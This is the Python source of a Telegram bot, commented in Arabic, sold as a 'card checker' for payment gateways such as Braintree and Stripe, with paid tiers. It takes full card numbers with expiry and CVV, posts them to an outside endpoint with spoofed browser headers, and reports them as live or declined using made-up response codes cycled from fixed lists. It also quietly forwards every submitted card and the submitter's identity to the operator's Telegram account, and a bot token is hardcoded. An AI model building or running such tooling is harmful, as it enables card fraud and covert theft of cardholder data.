import json
import os
import random
import re
import time
import requests
import telebot
from telebot import types

# بيانات البوت والمطور
TOKEN = "8740474398:AAEkOqeBUESFH_blGgQU_A4spf2d14dP0Jw"
ADMIN_ID = 1696448892
DEV_USERNAME = "@x6f_0"
CHANNEL_USERNAME = "@Beson2000"
CHANNEL_URL = "https://t.me/Beson2000"

bot = telebot.TeleBot(TOKEN)

URL = "https://mock.payate.com/api.php"
CACHE_FILE = "cache.json"

PRINTERY_SUCCESS_RESPONSES = [
    "100:Approved",
    "1000:Transaction Approved",
    "101:Approved - Duplicate Transaction",
    "102:Approved - Partial Approval",
    "103:Approved - Address Verification Passed",
    "104:Approved - CVV Matched",
    "200:Successful Payment",
    "201:Payment Authorized",
    "202:Captured Successfully",
]

PRINTERY_FAIL_RESPONSES = [
    "2001:Declined - Insufficient Funds",
    "2002:Declined - Do Not Honor",
    "2003:Declined - Invalid Card",
    "2004:Declined - Expired Card",
    "2005:Declined - Restricted Card",
    "2006:Declined - CVV Mismatch",
    "2007:Declined - Transaction Not Allowed",
    "2008:Declined - Suspected Fraud",
    "2009:Declined - Limit Exceeded",
    "2010:Error - System Malfunction",
]

PRINTERY_UNKNOWN_RESPONSES = [
    "3001:Review - Fraud Check Required",
    "3002:Verification Required - 3D Secure Challenge",
    "3003:Hold - Risk Score High",
    "3004:Pending - Manual Review Needed",
    "3005:Review - Address Mismatch Warning",
]

success_index = 0
fail_index = 0
unknown_index = 0


def load_cache():
  if os.path.exists(CACHE_FILE):
    try:
      with open(CACHE_FILE, "r", encoding="utf-8") as f:
        return json.load(f)
    except json.JSONDecodeError:
      return {}
  return {}


def save_cache(cache_data):
  with open(CACHE_FILE, "w", encoding="utf-8") as f:
    json.dump(cache_data, f, ensure_ascii=False, indent=4)


response_cache = load_cache()


# دالة التحقق من خوارزمية لوهن (Luhn Algorithm)
def luhn_check(card_num):
  digits = [int(x) for x in card_num if x.isdigit()]
  if not digits:
    return False
  checksum = 0
  double_digit = False
  for digit in reversed(digits):
    if double_digit:
      digit *= 2
      if digit > 9:
        digit -= 9
    checksum += digit
    double_digit = not double_digit
  return checksum % 10 == 0


# دالة التحقق من الاشتراك في القناة
def check_user_subscription(user_id):
  try:
    member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
    if member.status in ["member", "administrator", "creator"]:
      return True
  except Exception as e:
    print(f"Error checking subscription: {e}")
  return False


# دالة جلب معلومات البين من API خارجي
def get_bin_info(card_number):
  bin_code = card_number[:6]
  try:
    headers = {"Accept-Version": "3"}
    res = requests.get(
        f"https://lookup.binlist.net/{bin_code}", headers=headers, timeout=5
    )
    if res.status_code == 200:
      data = res.json()
      scheme = data.get("scheme", "UNKNOWN").upper()
      card_type = data.get("type", "UNKNOWN").upper()
      brand = data.get("brand", "").upper()
      bank_name = (
          data.get("bank", {}).get("name", "UNKNOWN BANK").upper()
      )
      country_name = (
          data.get("country", {}).get("name", "UNKNOWN COUNTRY").upper()
      )
      country_emoji = data.get("country", {}).get("emoji", "")

      category = f"{scheme} - {card_type}"
      if brand:
        category += f" - {brand}"

      return {
          "bin_info": category,
          "bank": bank_name,
          "country": f"{country_name} {country_emoji}",
      }
  except Exception as e:
    print(f"Bin lookup error: {e}")

  return {
      "bin_info": "UNKNOWN - UNKNOWN",
      "bank": "UNKNOWN BANK",
      "country": "UNKNOWN 🌍",
  }


# أمر البدء /start
@bot.message_handler(commands=["start"])
def send_welcome(message):
  user_id = message.from_user.id
  markup = types.InlineKeyboardMarkup()
  btn_join = types.InlineKeyboardButton(
      text="📢 انضم إلى القناة للاستمرار", url=CHANNEL_URL
  )
  btn_check = types.InlineKeyboardButton(
      text="✅ تحقق من الاشتراك", callback_data="check_sub"
  )
  markup.add(btn_join)
  markup.add(btn_check)

  welcome_text = (
      "👋 أهلاً بك عزيزي في بوت فحص الخدمات والبوابات.\n\n🔒 للاستخدام، يجب"
      " عليك الانضمام إلى قناتنا أولاً ثم الضغط على زر التحقق."
  )
  bot.send_message(message.chat.id, welcome_text, reply_markup=markup)


# استقبال أمر الفحص المجاني /bes
@bot.message_handler(commands=["bes"])
def handle_bes_command(message):
  process_card_check(message, "Braintree Auth 1")


# استقبال الأوامر الأخرى المجانية والمدفوعة لتظهر رسالة جاري التطوير أو الشراء
@bot.message_handler(commands=["st", "ad", "wc"])
def handle_free_other_commands(message):
  bot.reply_to(message, "⚠️ هذه البوابة قيد التطوير حالياً من المطور بيسون BESON ...")


@bot.message_handler(commands=["chk", "chs", "cha", "chc"])
def handle_paid_commands(message):
  bot.reply_to(
      message,
      f"💎 هذه البوابة مدفوعة! يرجى التواصل مع المطور لشراء الخدمة: {DEV_USERNAME}",
  )


def process_card_check(message, gateway_name):
  user_id = message.from_user.id
  chat_id = message.chat.id
  username = (
      f"@{message.from_user.username}"
      if message.from_user.username
      else message.from_user.first_name
  )

  if not check_user_subscription(user_id):
    bot.reply_to(
        message,
        "❌ يجب عليك الانضمام إلى قناتنا أولاً (`@Beson2000`) لاستخدام أمر"
        " الفحص!\nاضغط /start للبدء.",
        parse_mode="Markdown",
    )
    return

  text_parts = message.text.split(maxsplit=1)
  if len(text_parts) < 2:
    bot.reply_to(
        message,
        "⚠️ يرجى كتابة البيانات بالشكل الصحيح:\nمثال:\n`/bes"
        " 5332480177686690|04|2027|084`",
        parse_mode="Markdown",
    )
    return

  card_input = text_parts[1].strip()

  parts = card_input.split("|")
  if len(parts) == 4:
    cc, mm, yy, cvv = parts
    
    if not luhn_check(cc):
      bot.reply_to(
          message, "❌ The card is invalid. Lohn's algorithm for cards."
      )
      return

    if len(yy) == 2:
      yy = "20" + yy

    try:
      if int(yy) > 2034:
        bot.reply_to(
            message,
            "❌ Error: Card is invalid or expiration year is too far (Max year"
            " is 2034).",
        )
        return
    except ValueError:
      bot.reply_to(message, "❌ Error: Invalid card format.")
      return

    record = f"{cc}|{mm}|{yy}|{cvv}"
  else:
    if not luhn_check(card_input.split("|")[0]):
      bot.reply_to(
          message, "❌ The card is invalid. Lohn's algorithm for cards."
      )
      return
    record = card_input

  sent_msg = bot.reply_to(message, "⏳ Card exploration in progress...")

  start_time = time.time()
  sleep_time = random.randint(6, 25)
  time.sleep(sleep_time)

  global success_index, fail_index, unknown_index

  headers = {
      "authority": "mock.payate.com",
      "accept": "*/*",
      "accept-language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://mock.payate.com",
      "referer": "https://mock.payate.com/",
      "user-agent": (
          "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like"
          " Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
      ),
      "x-requested-with": "XMLHttpRequest",
  }

  try:
    with requests.Session() as session:
      session.headers.update(headers)

      payload = {"data": record}
      response = session.post(URL, data=payload, timeout=20)

      if response.status_code != 200 or not response.content:
        bot.edit_message_text(
            "Try again later, champ!",
            chat_id,
            sent_msg.message_id,
        )
        return

      result = response.json()
      msg_html = result.get("msg", "")

      if msg_html:
        clean_text = re.sub(r"<[^>]+>", "", msg_html)
        parts_res = [p.strip() for p in clean_text.split("|")]
        status = parts_res[0] if len(parts_res) > 0 else "Unknown"

        status_text = ""
        response_code = ""

        if status.lower() == "live":
          p_response = PRINTERY_SUCCESS_RESPONSES[success_index]
          status_text = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
          response_code = f"({p_response})"
          success_index = (success_index + 1) % len(PRINTERY_SUCCESS_RESPONSES)
        elif status.lower() == "die" or status.lower() == "declined":
          f_response = PRINTERY_FAIL_RESPONSES[fail_index]
          status_text = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
          response_code = f"({f_response})"
          fail_index = (fail_index + 1) % len(PRINTERY_FAIL_RESPONSES)
        else:
          u_response = PRINTERY_UNKNOWN_RESPONSES[unknown_index]
          status_text = "𝗥𝗲𝘃𝗶𝗲𝘄 ⚠️"
          response_code = f"({u_response})"
          unknown_index = (unknown_index + 1) % len(PRINTERY_UNKNOWN_RESPONSES)

        bin_data = get_bin_info(cc)
        elapsed_seconds = round(time.time() - start_time, 2)

        result_msg = (
            f"{status_text}\n\n"
            f"𝗖𝗖 ⇾ `{record}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway_name}\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_code}\n\n"
            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_data['bin_info']}\n"
            f"𝗕𝗮𝗻𝗸: {bin_data['bank']}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_data['country']}\n\n"
            f"𝗧𝗼𝗼𝗸 {elapsed_seconds:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
        )

        bot.edit_message_text(
            result_msg, chat_id, sent_msg.message_id, parse_mode="Markdown"
        )

        admin_log = (
            f"🔔 عملية فحص جديدة:\n"
            f"👤 المستخدم: {username} ({user_id})\n"
            f"📌 الأمر المدخل: /bes {card_input}\n\n"
            f"{result_msg.replace('`', '')}"
        )
        try:
          bot.send_message(ADMIN_ID, admin_log)
        except Exception as admin_err:
          print(f"Failed to send log to admin: {admin_err}")

      else:
        bot.edit_message_text(
            "Try again later, champ!", chat_id, sent_msg.message_id
        )

  except requests.exceptions.Timeout:
    bot.edit_message_text(
        "Try again later, champ!",
        chat_id,
        sent_msg.message_id,
    )
  except Exception as e:
    bot.edit_message_text(
        "Try again later, champ!",
        chat_id,
        sent_msg.message_id,
    )


# التعامل مع الأزرار والـ Callbacks
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
  user_id = call.from_user.id
  chat_id = call.message.chat.id
  message_id = call.message.message_id

  if call.data == "check_sub":
    if check_user_subscription(user_id):
      show_category_menu(chat_id, message_id)
    else:
      bot.answer_callback_query(
          call.id,
          "❌ لم تقم بالانضمام للقناة بعد! يرجى الانضمام أولاً.",
          show_alert=True,
      )

  elif call.data == "menu_charge":
    bot.answer_callback_query(
        call.id,
        f"💎 بوابات Charge مدفوعة! يرجى التواصل مع المطور لشراء الخدمة: {DEV_USERNAME}",
        show_alert=True,
    )

  elif call.data == "menu_auth":
    show_gateways(chat_id, message_id)

  elif call.data == "menu_orders":
    show_orders_menu(chat_id, message_id)

  elif call.data == "back_to_categories":
    show_category_menu(chat_id, message_id)

  elif call.data == "gateway_printery":
    text = (
        "🔥 **أهلاً بك في بوابة برنتري (Braintree Auth 1)!**\n"
        "⚡ أرسل البطاقة بأحد النمطين التاليين:\n\n"
        "📌 **النمط الأول:**\n"
        "`/bes 5332480177686690|04|2027|084`\n\n"
        "📌 **النمط الثاني:**\n"
        "`/bes 5332480177686690|04|27|084`\n\n"
        "🚀 أرسل الأمر الآن مع التحقق التلقائي لخوارزمية لوهن!"
    )
    bot.edit_message_text(
        text, chat_id, message_id, parse_mode="Markdown", reply_markup=None
    )

  elif call.data in [
      "gateway_stripe",
      "gateway_adyen",
      "gateway_woocommerce",
      "gateway_paypal",
  ]:
    bot.answer_callback_query(
        call.id, "⚠️ جاري التطوير من المطور بيسون BESON ...", show_alert=True
    )


def show_category_menu(chat_id, message_id):
  markup = types.InlineKeyboardMarkup(row_width=2)
  btn_charge = types.InlineKeyboardButton(
      text="💎 بوابات Charge (مدفوعة)", callback_data="menu_charge"
  )
  btn_auth = types.InlineKeyboardButton(
      text="🔒 بوابات Auth", callback_data="menu_auth"
  )
  btn_orders = types.InlineKeyboardButton(
      text="📋 Orders (أوامر الفحص)", callback_data="menu_orders"
  )
  markup.add(btn_charge, btn_auth)
  markup.add(btn_orders)

  text = (
      "✅ **تم التحقق من اشتراكك بنجاح!**\n\nاختر القسم الذي ترغب في استعراضه أدناه:"
  )
  bot.edit_message_text(
      text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown"
  )


def show_orders_menu(chat_id, message_id):
  markup = types.InlineKeyboardMarkup(row_width=1)
  btn_back = types.InlineKeyboardButton(
      text="⬅️ رجوع للقائمة الرئيسية", callback_data="back_to_categories"
  )
  markup.add(btn_back)

  orders_text = (
      "📋 **قائمة أوامر الفحص (Orders):**\n\n"
      "🟢 **أولاً: الأوامر المجانية (Free Commands):**\n"
      "• Braintree: `/bes`\n"
      "• Stripe: `/st`\n"
      "• Adyen: `/ad`\n"
      "• WooCommerce: `/wc`\n\n"
      "💎 **ثانياً: الأوامر المدفوعة (Paid Commands):**\n"
      f"• Braintree: `/chk` (للتواصل: {DEV_USERNAME})\n"
      f"• Stripe: `/chs` (للتواصل: {DEV_USERNAME})\n"
      f"• Adyen: `/cha` (للتواصل: {DEV_USERNAME})\n"
      f"• WooCommerce: `/chc` (للتواصل: {DEV_USERNAME})"
  )
  bot.edit_message_text(
      orders_text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown"
  )


def show_gateways(chat_id, message_id):
  markup = types.InlineKeyboardMarkup(row_width=2)
  btn_printery = types.InlineKeyboardButton(
      text="🔥 Printery (Braintree Auth 1)", callback_data="gateway_printery"
  )
  btn_stripe = types.InlineKeyboardButton(
      text="💳 Stripe (سترايب)", callback_data="gateway_stripe"
  )
  btn_adyen = types.InlineKeyboardButton(
      text="🌐 Adyen (آدين)", callback_data="gateway_adyen"
  )
  btn_woo = types.InlineKeyboardButton(
      text="🛒 WooCommerce (ووكوميرس)", callback_data="gateway_woocommerce"
  )
  btn_paypal = types.InlineKeyboardButton(
      text="🅿️ PayPal (باي بال)", callback_data="gateway_paypal"
  )
  btn_back = types.InlineKeyboardButton(
      text="⬅️ رجوع", callback_data="back_to_categories"
  )

  markup.add(btn_printery, btn_stripe)
  markup.add(btn_adyen, btn_woo)
  markup.add(btn_paypal)
  markup.add(btn_back)

  text = (
      "🌐 **تم استعراض بوابات Auth بنجاح!**\n\nيرجى اختيار بوابة الدفع المطلوبة أدناه:"
  )
  bot.edit_message_text(
      text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown"
  )


if __name__ == "__main__":
  print(
      "🤖 البوت يعمل بكامل الميزات مع رسالة الخطأ المخصصة (Try again later,"
      " champ!)..."
  )
  while True:
    try:
      bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
      print(f"⚠️ حدث خطأ في الاتصال: {e}")
      print("🔄 جاري إعادة المحاولة خلال 5 ثوانٍ...")
      time.sleep(5)
